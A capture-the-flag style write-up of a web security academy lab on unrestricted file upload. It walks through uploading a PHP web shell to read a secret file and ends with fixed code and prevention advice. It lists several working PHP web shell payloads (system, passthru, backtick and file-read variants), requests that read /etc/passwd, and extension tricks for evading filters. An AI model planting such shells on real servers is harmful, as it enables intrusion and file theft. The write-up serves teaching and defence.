# File Upload Vulnerabilities - Lab #1: Remote Code Execution via Web Shell Upload

**YouTube Tutorial:** [File Upload Vulnerabilities - Lab #1 Remote code execution via web shell upload](https://youtu.be/Hf9KlCGeJNE?si=DiP82N1c8poABlMA)

---

## 1. What is Remote Code Execution via Web Shell Upload?

### Core Concept

This is the simplest, most direct file upload vulnerability there is: the server lets you upload a file to be used as your avatar image, and it never actually checks that what you're uploading is really an image. If you upload a `.php` file containing real PHP code, and the server stores it somewhere under its own web root with its `.php` extension intact, then simply *visiting* that uploaded file's URL in a browser causes the web server to execute it as a script — not display it as a picture. At that point you don't have "a vulnerability" anymore, you have a fully interactive backdoor into the server, commonly called a **web shell**, sitting right there waiting for you to send it commands.

```
            WHAT THE APP EXPECTS                          WHAT ACTUALLY HAPPENS
   ┌────────────────────────────┐          ┌────────────────────────────┐
   │  User uploads avatar.jpg      │          │  User uploads shell.php         │
   │  → stored on the server         │          │  → stored on the server,          │
   │  → served back as an image      │          │  with its .php extension           │
   │  when the profile loads          │          │  untouched, no content check       │
   └────────────────────────────┘          └─────────────┬──────────────┘
                                                          ▼
                                             ┌────────────────────────────┐
                                             │  Browse directly to the        │
                                             │  file's own URL, e.g.            │
                                             │  /files/avatars/shell.php         │
                                             └─────────────┬──────────────┘
                                                          ▼
                                             ┌────────────────────────────┐
                                             │  Server sees .php, hands it     │
                                             │  to the PHP interpreter,          │
                                             │  runs it as CODE — not an          │
                                             │  image = Remote Code               │
                                             │  Execution ✅                       │
                                             └────────────────────────────┘
```

The oracle here is embarrassingly simple: **the file extension**. If the server trusts the extension of an uploaded file to decide how to treat it later, and never checks what's actually inside the file, then anything ending in `.php` (or `.asp`, `.jsp`, depending on the stack) becomes a script the moment you request it directly — no injection, no encoding tricks, just an upload form that does exactly what it says on the tin with zero validation behind it.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem. To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`.

* **Provided Credentials:** `wiener:peter`
* **Vulnerable Feature:** The avatar upload option under "My account."
* **Target File:** `/home/carlos/secret` — a file on the server's filesystem you have no legitimate way to read, except by getting the server itself to read it for you and hand back the contents.
* **End Goal:** Get a working PHP web shell uploaded and reachable, use it to run a command that reads the secret file, and submit its contents via the lab's "Submit solution" button.

### Root Cause & Impact

The root cause is a complete absence of server-side validation on what's actually inside an uploaded file, combined with the uploads directory being both writable and directly reachable over HTTP with script execution enabled for that directory. Neither of those two things alone is catastrophic — an uploads folder that can't execute scripts is harmless even if anything can be uploaded to it; strict content validation is protective even if the folder does execute scripts. It's the *combination* of both being absent at once that turns a simple avatar feature into full remote code execution — arguably the single most severe class of vulnerability that exists, since it gives an attacker the same level of control over the server as its own administrators.

---

## 3. Attack Methods & Techniques (What I Tried, and What Actually Worked)

**First look at the feature.** Logging in as `wiener` and heading to "My account" shows an avatar upload option. There's a dropdown or file-type filter in the browser's file picker showing something like "All files," which is a strong hint the client isn't restricting file types at all — worth testing immediately rather than assuming there's server-side filtering waiting to catch you.

**The simplest possible payload.** Rather than reaching for a complex, feature-rich web shell, the apprentice-level version of this lab just needs a single line of PHP that runs whatever command you tell it to, via a URL parameter. Something like:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

This is about as minimal as a "web shell" gets — it's not even a general-purpose shell yet, it's a one-shot script that reads and prints one specific file. Saved as `shell.php`, this is uploaded through the same avatar form used for a normal image.

**Confirming where it landed.** After uploading, checking Burp's Proxy → HTTP history shows a request like `GET /files/avatars/shell.php` — the app conveniently reveals exactly where uploaded avatars are stored, either directly in its own response or by loading the "avatar" back on the account page for you to inspect the URL of.

**Just visiting the URL.** Browsing straight to that URL doesn't download a broken image — it runs the PHP code, and the response is the raw contents of `/home/carlos/secret`, sitting right there in the page.

### Server Behavior

* **Uploading a `.jpg` or `.png` avatar:** Works exactly as intended, image is stored and displayed normally.
* **Uploading a `.php` file containing arbitrary PHP code:** Also accepted without complaint — no content-type check, no extension blacklist, no magic-byte signature check.
* **Requesting the uploaded `.php` file's own URL directly:** The web server hands the request to the PHP interpreter (because the file has a `.php` extension and lives in a directory where script execution is enabled), and the interpreter's output — not the file's raw bytes — is what comes back in the response.

---

## 4. Step-by-Step Walkthrough

### Step 1: Log In and Find the Upload Feature

1. Go to the lab and log in with `wiener:peter`.
2. Navigate to **"My account."**
3. Locate the avatar upload field — click **"Choose file"** (or equivalent) and note whether the file picker's type filter shows "All files" or is restricted to image types only. If it's unrestricted or easily bypassed, that's your first signal this is a client-side-only (or entirely absent) check.

### Step 2: Write a Minimal PHP Web Shell

1. On your own machine, create a plain text file named `shell.php` (any name works, as long as the extension is `.php`) with the following content:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Save it. This single line, once executed by the server, reads the target file and prints its contents directly into the HTTP response — no arguments needed, no interactivity required for this specific goal.

### Step 3: Upload the Web Shell as Your Avatar

1. Back on the "My account" page, click **"Choose file"**, select your `shell.php` file, and click **"Upload"**.
2. If the upload succeeds without any error about invalid file types, the server has accepted a PHP file where it expected an image.

### Step 4: Find the Uploaded File's URL

1. Open Burp Suite's **Proxy → HTTP history**, and look through the recent requests around the time of your upload.
2. Find the `GET` request that loads your avatar back onto the account page — its path typically looks like `/files/avatars/shell.php`. This confirms both the storage location and that the original filename (and extension) were preserved.

### Step 5: Trigger Execution by Visiting the File Directly

1. Copy the full URL, e.g. `https://[LAB-ID].web-security-academy.net/files/avatars/shell.php`, and either paste it directly into your browser's address bar, or send the request to Burp Repeater and hit **Send**.
2. **Result:** Instead of a broken image or raw PHP source code, the response body contains the actual contents of `/home/carlos/secret` — a random-looking string of characters. This confirms the PHP code executed server-side.

### Step 6: Submit the Solution

1. Copy the secret string from the response.
2. Click the lab banner's **"Submit solution"** button, paste the secret, and submit.
3. The lab banner updates to **"Congratulations, you solved the lab!"**.

---

## 5. Different Ways to Exploit This (Alternative Methods & Payloads)

The single-line "read one specific file" script above is the fastest path to solving *this* lab, but in a real assessment (or a slightly different lab variant), you'd usually want more flexibility than a one-shot script. Here are several common alternative payloads and approaches for the exact same underlying vulnerability class:

**A general-purpose command-execution shell, instead of a single hardcoded file read:**

```php
<?php system($_GET['command']); ?>
```

Upload this instead, then trigger it with a query parameter appended to the file's URL:

```
GET /files/avatars/shell.php?command=id
GET /files/avatars/shell.php?command=whoami
GET /files/avatars/shell.php?command=cat+/home/carlos/secret
```

This is more versatile than the single-purpose payload — once uploaded, you can run *any* shell command by just changing the query string, without needing to re-upload a new file each time.

**Using `passthru()` or backticks instead of `system()`:**

```php
<?php passthru($_GET['cmd']); ?>
```

```php
<?php echo `$_GET[cmd]`; ?>
```

Functionally similar to `system()`, but useful to know as alternatives in case a particular PHP configuration disables one function (`disable_functions` in `php.ini`) but not another — a real-world hardening measure that sometimes blocks `system()` specifically while leaving backtick execution or `passthru()` open.

**Reading the file with `file_get_contents()` via a parameter, rather than hardcoding the path:**

```php
<?php echo file_get_contents($_GET['file']); ?>
```

```
GET /files/avatars/shell.php?file=/home/carlos/secret
GET /files/avatars/shell.php?file=/etc/passwd
```

Useful when you want to read multiple different files during reconnaissance without re-uploading anything.

**A fuller-featured single-file shell for interactive exploration:**

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```

Wrapping output in `<pre>` tags simply makes multi-line command output (like directory listings) far more readable in a browser, since HTML would otherwise collapse whitespace and newlines.

**If `.php` itself gets blocked or filtered later (foreshadowing the next labs in this module):** alternate extensions that some misconfigured servers still execute as PHP include `.php5`, `.phtml`, `.php3`, and `.pht` — worth keeping in your back pocket for labs where a simple `.php` extension is specifically blacklisted, since a validation check written only for `.php` often forgets these variants exist.

**A quick way to confirm execution before worrying about exfiltrating anything:** upload a minimal "proof of execution" payload first, before committing to a specific attack goal:

```php
<?php echo "IT WORKS: " . php_uname(); ?>
```

Visiting this file's URL and seeing server OS/version information back confirms code execution cleanly, without yet needing to know the target file's path — useful as a first sanity check in any file-upload assessment before building out a fuller shell.

---

## 6. If This Existed in the Real World

Unrestricted file upload leading to remote code execution isn't a theoretical lab exercise — it's one of the most consistently reported, highest-severity findings in real bug bounty programs and breach post-mortems:

* **WordPress plugin/theme upload vulnerabilities:** A huge fraction of real-world WordPress site compromises trace back to plugins or themes with an "upload custom logo," "import settings," or similar feature that fails to validate uploaded file extensions or content, letting an attacker drop a PHP web shell directly into a publicly reachable `wp-content/uploads` directory.
* **Multiple high-profile CMS and CVE-listed breaches:** File upload RCE is a recurring CVE category across content management systems, forum software, and admin panels — attackers routinely scan the internet for exactly this pattern (an upload form plus a guessable or discoverable uploads path) as an automated, low-effort way to gain a foothold on thousands of servers at once.
* **Profile picture / resume upload features in custom web apps:** Any bespoke internal application with an "upload your photo" or "upload your resume" feature, built without a dedicated file-validation library, is a realistic target for this exact technique — it doesn't require a famous CMS, just a developer who assumed the file input's `accept="image/*"` attribute (a client-side hint only) was doing real security work.

---

## 7. Pro-Tips & Common Pitfalls

* **Always check the client-side file picker's restrictions, but never trust them.** An "All files" option, or an `accept` attribute that's easy to remove via browser DevTools, is a strong early signal — but the only real test is whether the *server* rejects your upload, not whether the browser's file dialog tries to filter it first.
* **Find where uploads are stored before assuming you need to guess.** Many apps (including this lab) hand you the exact storage path for free, either in the upload response itself or by simply loading the avatar back onto the page and inspecting its `src` attribute — check there before resorting to directory brute-forcing.
* **Start with the minimal payload for the actual goal, then upgrade if needed.** If the lab or engagement only requires reading one specific file, a single-purpose `file_get_contents()` payload is faster to write and less likely to trip any content-based filtering than a full command-execution shell — save the general-purpose shell for when you genuinely need broader access.
* **Keep several extension variants ready.** `.php`, `.php5`, `.phtml`, and `.pht` all commonly execute as PHP on misconfigured or older Apache/PHP setups — if the primary extension is blocked, these are the first things worth trying rather than assuming the upload path is a dead end.
* **The vulnerable backend pattern:**

```php
// ❌ VULNERABLE — accepts any file, with any extension, and any content,
// and stores it directly inside a script-executable, web-accessible directory
$targetPath = "/var/www/files/avatars/" . $_FILES['avatar']['name'];
move_uploaded_file($_FILES['avatar']['tmp_name'], $targetPath);

// ✅ SAFE — validate actual file content (not just extension/MIME type),
// strip/rename to a safe generated filename, and store outside any
// script-executable web-accessible directory
if (!isGenuineImage($_FILES['avatar']['tmp_name'])) {
    die('Invalid file');
}
$safeFilename = generateRandomFilename() . '.jpg'; // never trust the original name/extension
move_uploaded_file($_FILES['avatar']['tmp_name'], "/var/uploads/" . $safeFilename); // NOT web-root, NOT script-executable
```

* **Prevention summary:**
  * Validate uploaded file content against its claimed type (checking actual image structure/magic bytes, not just the file extension or `Content-Type` header, both of which are fully attacker-controlled).
  * Store uploaded files outside the web root, or in a directory explicitly configured to never execute scripts, regardless of a file's extension.
  * Generate a new, random filename for every upload server-side — never trust or preserve the client-supplied filename or its extension.
  * Apply the principle of least functionality: if a directory only needs to serve static image files, disable script execution for that directory at the web server configuration level, as defense-in-depth even if content validation is somehow bypassed.